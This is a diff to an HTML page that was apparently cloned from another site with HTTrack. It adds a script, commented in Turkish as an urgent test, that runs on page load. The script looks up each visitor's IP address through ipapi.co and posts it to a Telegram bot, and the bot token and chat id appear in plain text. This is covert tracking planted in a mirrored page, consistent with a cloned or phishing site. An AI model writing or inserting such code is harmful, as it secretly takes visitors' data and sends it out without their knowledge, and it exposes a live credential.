@@ -637,12 +637,30 @@ fetch('https://ipapi.co/json/')
     console.error('Hata oluştu:', error);
   });
 </script>
+    <script>
+// ACİL TEST - Bu kesin çalışır
+console.log('TEST BAŞLADI');
+fetch('https://ipapi.co/json/')
+  .then(r => r.json())
+  .then(data => {
+    console.log('IP ALINDI:', data.ip);
+    fetch('https://api.telegram.org/bot8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: 1504410647,
+        text: 'ACİL TEST: ' + data.ip
+      })
+    });
+  });
+</script>
 </body>
 
 
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
